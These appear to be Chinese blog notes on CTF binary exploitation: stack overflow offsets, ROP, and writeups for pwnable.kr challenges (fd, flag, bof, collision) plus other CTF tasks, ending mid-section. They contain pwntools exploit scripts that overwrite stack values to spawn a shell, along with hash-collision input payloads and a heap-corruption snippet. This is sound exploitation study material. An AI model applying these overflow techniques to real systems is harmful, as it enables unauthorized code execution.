<h2 id="溢出点进阶"><a href="#溢出点进阶" class="headerlink" title="溢出点进阶"></a>溢出点进阶</h2><p>我们之前知道了栈的ret可以受我们控制,那么我们是否可以将某些敏感函数写入ret呢,答案是肯定的,同时要在32位程序中函数的参数是布置在栈中的</p>
<p>(示意图,待画)</p>
<p>所以我们完全可以这样布置<code>padding(到达溢出点)+function_we_want+ret+parameter</code></p>
<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>这篇我们要深入理解ret的含义,要知道ret在汇编中代表这<code>pop eip</code>,暂且这么理解,这就像我们在栈中布置了一个地址,例如是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x123   push eax</span><br><span class="line">0x134   ret</span><br></pre></td></tr></table></figure>
<p>例如我们的程序溢出点是20个,我们就可以这么构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">0x123&lt;-原ret</span><br></pre></td></tr></table></figure>

<p>我们把0x123写入栈的ret,那么我们的程序在会跳转到<code>push eax</code>中,之后又执行ret,但是我们的栈顶指向eax,所以我们就会跳转到eax的指向中,大家可以好好理解一下</p>
<h2 id="vsdo"><a href="#vsdo" class="headerlink" title="vsdo"></a>vsdo</h2><p>这个的点就比较骚了，我们知道只要程序开启了pie，我们就很难确定libc中的函数，所以我们这时候看到vsdo在内存中的位置是不变的,这时我们根据调用函数的返回值.可以利用他来起shell,比如说我们通过one_gagede找到了一个片段,其中的限制条件是eax为0,我们就可以根据他来起</p>
<p>这几天做题发现没有什么会做的,还是要夯实基础,于是在<strong>i春秋</strong>上找了篇教程也算是重新学习一遍吧,环境搭建不谈了,还有做题环境(ida,pwntools),没有gdb可能觉得对新手不太友好,我也不算新手了,算是个老菜鸡了,还是做吧</p>
<h2 id="溢出点寻找"><a href="#溢出点寻找" class="headerlink" title="溢出点寻找"></a>溢出点寻找</h2><p>这个作者写的栈溢出基础,关键就是溢出点的判断,<strong>hello</strong>和<strong>csaw ctf 2016 quals-warmup</strong>不谈了,直接无脑<code>cyclic</code>就行,从之后开始就开始学新东西了</p>
<h3 id="doubly-dangerous"><a href="#doubly-dangerous" class="headerlink" title="doubly_dangerous"></a>doubly_dangerous</h3><p>这题没有找到很好的思路,溢出点的思路行不通,只能通过让<code>if</code>的语句成立,<code>s</code>和<code>v5</code>相差<strong>0x40</strong>个字节,直接修改<code>v5</code>即可,修改后的exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io =process(&#x27;doubly_dangerous&#x27;)</span><br><span class="line">payload = &#x27;A&#x27;*64</span><br><span class="line">payload += &quot;\x00\x80\x34\x41&quot;</span><br><span class="line"></span><br><span class="line">print io.recv()					</span><br><span class="line">io.sendline(payload)			</span><br><span class="line">print io.recv()					</span><br></pre></td></tr></table></figure>

<h3 id="sCTF-2016-q1-pwn1"><a href="#sCTF-2016-q1-pwn1" class="headerlink" title="sCTF 2016 q1-pwn1"></a>sCTF 2016 q1-pwn1</h3><p>这题思路很请奇,<code>fget</code>只接收32个字节,我们可以知道到栈底有0x3c个字节,加上ebp足足有0x40个字节,也就是64个字节,但是我们使用ida分析的时候会发现他进行了个替换,把所有<code>I</code>替换成了<code>you</code>,这样我们只需要写<code>I*(63/3)+x+ret</code>即可完成</p>
<h3 id="Tokyo-West-CTF-3rd-2017-just-do-it"><a href="#Tokyo-West-CTF-3rd-2017-just-do-it" class="headerlink" title="Tokyo West CTF 3rd 2017-just_do_it"></a>Tokyo West CTF 3rd 2017-just_do_it</h3><p>本题也并不是修改ret,而是要将<strong>v6</strong>的值进行改写因为会最后<code>put(v6)</code>,而且我们之前的flag文件已经打开存到了bss中</p>
<ul>
<li>直接到ret前看stack前4字节</li>
</ul>
<h2 id="some-bugs"><a href="#some-bugs" class="headerlink" title="some bugs"></a>some bugs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.查是否合法</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">	uint8_t* a = (uint8_t*) malloc(1);</span><br><span class="line">	void * B = malloc(0x10);</span><br><span class="line">	malloc(0x60);</span><br><span class="line">	a[8+16] = 0x41;</span><br><span class="line">	*(size_t*)(B+0x38) = 0x21;</span><br><span class="line">	free(B);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.malloc后的参数</span><br><span class="line">我之前一直以为是 4 个字节,后来发现可以是 8 个字节,这就是 house of force的基础,只要有这种 malloc(size_t) 这种都可以往这方面靠</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/08/08/2019-08-08-some_note/" data-id="cuidOcpP1U8BZoQgFZZ8BFnu3" data-title="一些笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-06-25-kr_1st" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/06/25/2019-06-25-kr_1st/" class="article-date">
  <time class="dt-published" datetime="2019-06-24T16:00:00.000Z" itemprop="datePublished">2019-06-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/06/25/2019-06-25-kr_1st/">pwnable.kr</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>分析pwnable.kr（和tw）上的题系列</p>
</blockquote>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>ssh上服务器，看到源代码，没必要下载，直接看c文件就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len = 0;</span><br><span class="line">	len = read(fd, buf, 32);</span><br><span class="line">	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">		printf(&quot;good job :)\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本题就是把<code>int fd = atoi( argv[1] ) - 0x1234;</code>中的<strong>fd</strong>搞成0即可，让后边的read函数第一个参数为标准输入0即可，0x1234-&gt;4660，然后再输<code>LETMEWIN</code>就搞定了🤣，这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fd@prowl:~$ ./fd</span><br><span class="line">pass argv[1] a number</span><br><span class="line">fd@prowl:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
<h2 id="main参数"><a href="#main参数" class="headerlink" title="main参数"></a>main参数</h2><p>本题分析一下main函数参数<strong>argc</strong>（参数个数），<strong>angv</strong>（参数，当成数组存储），<strong>envp</strong>（环境变量）</p>
<p>乱写了一堆代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">printf(&quot;%d\n&quot;,argc);</span><br><span class="line"></span><br><span class="line">for(int i = 0;;i++)</span><br><span class="line">	if(argv[i])</span><br><span class="line">	printf(&quot;%s\n&quot;,argv[i]);</span><br><span class="line">	</span><br><span class="line">for(int i = 0;;i++)</span><br><span class="line">	if(envp[i])</span><br><span class="line">	printf(&quot;%s\n&quot;,envp[i]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行一遍可以看看具体的含义，但是不知道为啥最后输出环境变量时会<code>Segmentation fault (core dumped)</code>，很迷，这里埋个伏笔吧，觉得是环境变量访问越界，有知道的大佬希望能指点一下本菜鸡</p>
<h2 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int val;</span><br><span class="line">   char str[20];</span><br><span class="line">   strcpy(str, &quot;98993489&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;String value = %s, Int value = %d\n&quot;, str, val);</span><br><span class="line">   strcpy(str, &quot;123\n254g9i0sd235.net&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;String value = %s, Int value = %d\n&quot;, str, val);</span><br><span class="line">   return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real</span><br><span class="line">String value = 98993489, Int value = 98993489</span><br><span class="line">String value = 123</span><br><span class="line">254g9i0sd235.net, Int value = 123</span><br></pre></td></tr></table></figure>

<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	int len = 0;</span><br><span class="line">for(int i = -1;i &lt; 5;i++)&#123;</span><br><span class="line">	len = read(i, buf, 32);</span><br><span class="line">	printf(&quot;%d:%s&quot;,i,buf);&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real</span><br><span class="line">q</span><br><span class="line">-1:0:q</span><br><span class="line">w</span><br><span class="line">1:w</span><br><span class="line">e</span><br><span class="line">2:e</span><br><span class="line">3:e</span><br><span class="line">4:e</span><br></pre></td></tr></table></figure>
<p>我们可以看到-1的时候read函数没有发生什么而且把标准输入的位置给占了，1，2都是正常的输入，到3的时候就不处理了，直接输出</p>
<p>我们看一看到底成功没有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	int len = 0;</span><br><span class="line">for(int i = -1;i &lt; 5;i++)&#123;</span><br><span class="line">	len = read(i, buf, 32);</span><br><span class="line">	printf(&quot;%d time:%s and the len is %d&quot;,i,buf,len);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real </span><br><span class="line">-1 time: and the len is -1</span><br><span class="line">q</span><br><span class="line">0 time:q</span><br><span class="line"> and the len is 2</span><br><span class="line">w</span><br><span class="line">1 time:w</span><br><span class="line"> and the len is 2</span><br><span class="line">e</span><br><span class="line">2 time:e</span><br><span class="line"> and the len is 2</span><br><span class="line">3 time:e</span><br><span class="line"> and the len is -1</span><br><span class="line">4 time:e</span><br><span class="line"> and the len is -1</span><br></pre></td></tr></table></figure>

<p>通过看上边的代码和结果我们简单总结一下<strong>read</strong>函数</p>
<ul>
<li><code>\n</code>也会被当作输入</li>
<li>返回值为输入长度，发生错误返回-1</li>
<li>-1的情况不太一样，和输入语境有关系？？</li>
</ul>
<blockquote>
<p>深入分析pwnable.kr上的题系列[二]</p>
</blockquote>
<p>先看这个逆向</p>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>有upx壳，直接脱了，发现<code>checksec</code>可以直接看壳子，好强啊，膜一下这个神器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ checksec flag</span><br><span class="line">[*] &#x27;/home/pic/Desktop/flag&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *dest; // ST08_8</span><br><span class="line"></span><br><span class="line">  puts(&quot;I will malloc() and strcpy the flag there. take it.&quot;, argv, envp);</span><br><span class="line">  dest = malloc(100LL);</span><br><span class="line">  strcpy(dest, flag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ida反编译结果，意思是我malloc一块然后把flag赋值到里边，然后直接看<strong>flag</strong>就完事了</p>
<p>这题源代码差不多长这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">char *flag = &quot;haha&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char *dest; </span><br><span class="line">  printf(&quot;I will malloc() and strcpy the flag there. take it.&quot;);</span><br><span class="line">  dest = malloc(100);</span><br><span class="line">  strcpy(dest, flag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>题目给的c文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">	char overflowme[32];</span><br><span class="line">	printf(&quot;overflow me : &quot;);</span><br><span class="line">	gets(overflowme);	// smash me!</span><br><span class="line">	if(key == 0xcafebabe)&#123;</span><br><span class="line">		system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Nah..\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	func(0xdeadbeef);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看到必须让<strong>key</strong>变成<code>0xcafebabe</code>我们知道调用函数时程序把参数入栈我们只需要让<code>overflowme</code>这个局部变量溢出即可，下面用两个工具ida和gdb调试搞一下</p>
<h3 id="方法一：ida"><a href="#方法一：ida" class="headerlink" title="方法一：ida"></a>方法一：ida</h3><p>看到key的位置在<code>ebp+8</code>，而<code>char s; // [esp+1Ch] [ebp-2Ch]</code>，两者相差52字节，exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bof&#x27;)</span><br><span class="line">p.recvuntil(&#x27;overflow me : \n&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*52+p32(0xcafebabe))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./bof&#x27;: pid 46987</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(pic) gid=1000(pic) groups=1000(pic),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br></pre></td></tr></table></figure>
<p>总是感觉这种方法不太优雅，下面说一下gdb神器</p>
<h3 id="方法二：gdb"><a href="#方法二：gdb" class="headerlink" title="方法二：gdb"></a>方法二：gdb</h3><p>直接<code>s</code>步入<code>func</code>里，到比较的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x56555654 &lt;func+40&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print $ebp</span><br><span class="line">$1 = (void *) 0xffffd1d8</span><br><span class="line">pwndbg&gt; x/16gx 0xffffd1d8+8</span><br><span class="line">0xffffd1e0:	0x00000000deadbeef	0x00000000565556b9</span><br><span class="line">0xffffd1f0:	0xf7fb6000f7fb6000	0xf7df6e8100000000</span><br><span class="line">0xffffd200:	0xffffd29400000001	0xffffd224ffffd29c</span><br><span class="line">0xffffd210:	0x0000000000000001	0xf7fe575af7fb6000</span><br><span class="line">0xffffd220:	0x00000000f7ffd000	0x00000000f7fb6000</span><br><span class="line">0xffffd230:	0x40c4cae300000000	0x0000000001bc4cf3</span><br><span class="line">0xffffd240:	0x0000000000000000	0x5655553000000001</span><br><span class="line">0xffffd250:	0xf7feae2000000000	0x56556ff4f7fe59b0</span><br></pre></td></tr></table></figure>
<p>我们看到了<code>0xdeadbeef</code>要和<code>0xcafebabe</code>比较，我们需要覆盖这个值，找一下偏移量</p>
<p>看一下<code>gets</code>函数参数，即<strong>overflowme</strong>地址，找到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x56555649 &lt;func+29&gt;    lea    eax, [ebp - 0x2c]</span><br><span class="line">0x5655564c &lt;func+32&gt;    mov    dword ptr [esp], eax</span><br><span class="line">0x5655564f &lt;func+35&gt;    call   gets &lt;0xf7e452b0&gt;</span><br></pre></td></tr></table></figure>
<p>eax值为<code>0xffffd1ac</code>，然后比较一波</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance 0xffffd1ac 0xffffd1d8+8</span><br><span class="line">0xffffd1ac-&gt;0xffffd1e0 is 0x34 bytes (0xd words)</span><br></pre></td></tr></table></figure>
<p>偏移量也为0x34，结束战斗</p>
<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>这题主要的是理解题目所给函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode = 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">	int* ip = (int*)p;</span><br><span class="line">	int i;</span><br><span class="line">	int res=0;</span><br><span class="line">	for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen(argv[1]) != 20)&#123;</span><br><span class="line">		printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(hashcode == check_password( argv[1] ))&#123;</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看到程序让我们输入第二个参数，且参数长度为20，然后跳到<code>check_password</code>函数中，我们看到它把char指针转成了int指针，所以每次加一都成了加四，让20个输入的字符经过逐个相加得到特定值即可，网上找了找思路，大致都是先算，然后用<code>echo</code>或<code>python</code>输入字节，然后发现一个大佬把特定字符给搞出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./col `echo -n -e &quot;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&quot; `</span><br><span class="line"> </span><br><span class="line">./col $(python -c &#x27;print &quot;\xc9\xce\xc5\x06&quot;*4+&quot;\xc8\xce\xc5\x06&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">./col `python -c &quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;`</span><br><span class="line"></span><br><span class="line">./col b4_9b4_9b4_9b4e4d8ZA(大佬行为)</span><br></pre></td></tr></table></figure>

<p>分析一下<code>python</code>这个小脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ (python -c &#x27;print &quot;\x6c\x73&quot;&#x27;)</span><br><span class="line">ls</span><br><span class="line">pic@ubuntu:~/Desktop$ $(python -c &#x27;print &quot;\x6c\x73&quot;&#x27;)</span><br><span class="line">col  flag  te.py</span><br><span class="line">pic@ubuntu:~/Desktop$ ls</span><br><span class="line">col  flag  te.py</span><br></pre></td></tr></table></figure>
<p>可以看到把<code>ls</code>经过转换后然后用python打印，不加<code>$</code>就是普通打印，加上就是<code>ls</code>命令，<code>echo</code>命令同理</p>
<blockquote>
<p>深入分析pwnable.kr上的题系列[三]</p>
</blockquote>
<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>看到这题，本质就是<code>rand()</code>函数的伪随机，我们在<code>rand</code>函数之前，未使用<code>srand</code>函数给种子，<code>rand</code>就自己调用<code>srand(1)</code>，（其实<code>srand(0)</code>也是这数，我们看看这个小demo</p>
